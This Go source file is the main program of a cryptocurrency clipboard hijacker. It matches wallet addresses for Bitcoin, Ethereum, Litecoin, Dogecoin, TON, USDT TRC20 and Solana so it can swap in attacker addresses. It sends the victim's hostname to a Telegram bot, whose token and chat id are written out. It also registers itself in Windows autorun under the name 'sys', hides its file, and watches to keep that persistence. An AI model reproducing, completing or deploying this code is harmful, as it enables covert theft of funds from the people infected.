package main

import (
	"fmt"
	"os"
	"regexp"

	"clipper/src/autorun"
	"clipper/src/clipper"
	"clipper/src/hide"
	"clipper/src/telegram"
)

var (
	btcRegex     = regexp.MustCompile(`^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$`)
	ethRegex     = regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
	ltcRegex     = regexp.MustCompile(`^(L|M)[A-Za-z0-9]{33}$|^ltc1[a-zA-Z0-9]{39,59}$`)
	dogeRegex    = regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$`)
	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9a-zA-Z_-]{46,48}$`)
	usdttrcRegex = regexp.MustCompile(`^T[A-Za-z0-9]{33}$`)
	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
)

/* *** change this *** */
var matchers = []clipper.Matcher{
	{Regex: btcRegex, Addr: "btc_clipped"},         // BTC
	{Regex: ethRegex, Addr: "eth_clipped"},         // ETH
	{Regex: ltcRegex, Addr: "ltc_clipped"},         // LTC
	{Regex: dogeRegex, Addr: "doge_clipped"},       // DOGE
	{Regex: tonRegex, Addr: "ton_clipped"},         // TON
	{Regex: usdttrcRegex, Addr: "usdttrc_clipped"}, // USDT TRC20
	{Regex: solRegex, Addr: "sol_clipped"},         // Solana
}

/* *** change this *** */
var (
	bot_token = "8544283395:AAGwBn1O27AyGnFA5XfKc9S7rdILbSkiq5s"
	chat_id   = "7336461438" // u can use group (starts with -100) or chat id
)

func main() {
	hostname, _ := os.Hostname()

	// send start log to telegram
	telegram.SendLog(fmt.Sprintf(
		"Connected - %s",
		hostname,
	), chat_id, bot_token)

	// we adding self to windows autorun
	selfDir, _ := autorun.GetSelfDir()
	autoRunName := "sys" // name autorun in registry
	_ = autorun.AddToAutorun(selfDir, autoRunName)

	_ = hide.HideFile(selfDir)

	// we starting main clipper process
	clipper.StartClipper(chat_id, bot_token, matchers)

	autorun.StartWatcher(selfDir, autoRunName)

	select {}
}